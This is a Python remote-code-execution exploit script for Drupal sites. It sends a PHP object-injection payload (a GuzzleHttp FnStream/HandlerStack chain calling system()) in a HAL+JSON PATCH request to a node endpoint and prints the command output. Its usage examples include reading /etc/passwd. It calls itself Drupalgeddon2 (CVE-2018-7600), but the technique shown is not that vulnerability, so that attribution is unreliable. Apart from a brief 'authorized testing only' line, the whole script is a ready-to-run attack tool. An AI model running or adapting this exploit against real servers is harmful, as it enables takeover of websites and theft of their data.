#!/usr/bin/env python3
"""
Drupalgeddon2 exploit (CVE-2018-7600) - REST API / HAL+JSON variant
For authorized penetration testing and CTF challenges only.

Usage:
    python3 drupalgeddon2.py <base_url> <node_id> <command>

Example:
    python3 drupalgeddon2.py http://target.local 1 "id"
    python3 drupalgeddon2.py http://target.local 1 "cat /etc/passwd"
"""

import sys
from urllib.parse import urljoin
import requests


def get_csrf_token(base: str, session: requests.Session) -> str:
    """Fetch CSRF token required for state-changing REST requests."""
    url = urljoin(base, "/rest/session/token")
    resp = session.get(url, timeout=10)
    resp.raise_for_status()
    return resp.text.strip()


def build_payload(base: str, cmd: str) -> dict:
    """
    Build the HAL+JSON payload carrying the PHP object injection.

    The 'options' field is deserialized by Drupal without sanitization,
    allowing us to inject a GuzzleHttp FnStream/HandlerStack chain that
    calls system() with our command as the handler.

    Critical: PHP serialization uses actual null bytes (\\x00) as class
    property visibility markers — NOT the literal string \\u0000.
    """
    null = "\x00"
    cmd_wrapped = f'echo "====START===="; {cmd} 2>&1; echo "====END===="'
    cmd_len = len(cmd_wrapped)

    options = (
        f'O:24:"GuzzleHttp\\Psr7\\FnStream":2:{{'
        f's:33:"{null}GuzzleHttp\\Psr7\\FnStream{null}methods";'
        f'a:1:{{'
        f's:5:"close";'
        f'a:2:{{'
        f'i:0;'
        f'O:23:"GuzzleHttp\\HandlerStack":3:{{'
        f's:32:"{null}GuzzleHttp\\HandlerStack{null}handler";'
        f's:{cmd_len}:"{cmd_wrapped}";'
        f's:30:"{null}GuzzleHttp\\HandlerStack{null}stack";'
        f'a:1:{{i:0;a:1:{{i:0;s:6:"system";}}}}'
        f's:31:"{null}GuzzleHttp\\HandlerStack{null}cached";'
        f'b:0;}}'
        f'i:1;s:7:"resolve";}}'
        f'}}'
        f's:9:"_fn_close";'
        f'a:2:{{i:0;r:4;i:1;s:7:"resolve";}}'
        f'}}'
    )

    return {
        "link": [{
            "value": "link",
            "options": options,
        }],
        "_links": {
            "type": {
                "href": urljoin(base, "/rest/type/shortcut/default")
            }
        }
    }


def exploit_node(base: str, node_id: int, cmd: str) -> str:
    """
    Exploit via PATCH request to an existing node endpoint.

    Steps:
      1. Open a session (cookie jar shared across requests)
      2. Fetch CSRF token from /rest/session/token
      3. PATCH /node/<id>?_format=hal_json with the injected payload
      4. Extract command output between sentinel markers
    """
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    # Step 1: get CSRF token
    try:
        csrf_token = get_csrf_token(base, session)
    except Exception as e:
        return f"[!] Failed to fetch CSRF token: {e}"

    # Step 2: build payload and headers
    payload = build_payload(base, cmd)
    headers = {
        "Content-Type": "application/hal+json",
        "X-CSRF-Token": csrf_token,
    }

    # Step 3: send PATCH
    url = urljoin(base, f"/node/{node_id}?_format=hal_json")
    try:
        resp = session.patch(url, json=payload, headers=headers, timeout=15)
    except requests.RequestException as e:
        return f"[!] Request failed: {e}"

    # Step 4: parse output
    body = resp.text

    if "====START====" in body and "====END====" in body:
        output = body.split("====START====")[1].split("====END====")[0].strip()
        return output if output else "[*] Command executed but produced no output."

    # Fallback: show status + snippet for debugging
    return (
        f"[!] Sentinel markers not found in response.\n"
        f"    HTTP {resp.status_code}\n"
        f"    Response snippet: {body[:400]}"
    )


def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <base_url> <node_id> <command>")
        print(f"Example: {sys.argv[0]} http://target.local 1 'id'")
        sys.exit(1)

    base_url = sys.argv[1].rstrip("/")
    try:
        node_id = int(sys.argv[2])
    except ValueError:
        print("[!] node_id must be an integer.")
        sys.exit(1)
    command = sys.argv[3]

    print(f"[*] Target : {base_url}")
    print(f"[*] Node ID: {node_id}")
    print(f"[*] Command: {command}")
    print(f"[*] Sending exploit...\n")

    result = exploit_node(base_url, node_id, command)
    print(result)


if __name__ == "__main__":
    main()
